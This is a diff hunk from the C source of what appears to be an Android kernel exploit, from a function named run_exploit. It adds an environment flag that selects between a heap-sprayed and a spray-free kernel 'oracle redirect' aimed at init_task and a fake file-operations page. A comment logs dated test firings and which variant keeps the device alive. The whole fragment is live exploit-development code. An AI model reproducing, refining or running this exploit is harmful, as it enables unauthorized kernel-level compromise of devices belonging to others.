@@ -2847,10 +2847,15 @@ int run_exploit(int argc, char **argv) {
     if (((env_flag("MODE4_SLIDE_ZERO", 0) &&
           !env_flag("MODE4_SLIDE_CRED", 0)) ||
          (env_flag("MODE4_SLIDE", 0) && !env_flag("MODE4_SLIDE_SWAP", 0))) &&
-        !env_flag("MODE4_SLIDE_CRED", 0)) {
+        !env_flag("MODE4_SLIDE_CRED", 0) &&
+        !env_flag("MODE4_SLIDE_SPRAY", 0)) {
       /* Z9–Z13 / O26–O28 died at pselect overlay of sprayed lock/task.
        * Park and spray-free SLIDE oracle are stack-only; pin lock/task
-       * to init_task BSS. SLIDE_SWAP still sprays (needs fake_fops page). */
+       * to init_task BSS. SLIDE_SWAP still sprays (needs fake_fops page).
+       * MODE4_SLIDE_SPRAY=1: 2026-08-29 — the spray-free redirect kills
+       * the boot/adb within ~30s (2/2 fires), leaving no window for the
+       * swap fire. The sprayed oracle redirect survived minutes on
+       * 2026-08-23 — that is the survivable variant for two-fire. */
       uint64_t it_off = (active_offsets && active_offsets->off_init_task)
                             ? active_offsets->off_init_task
                             : 0x027CC000ULL;
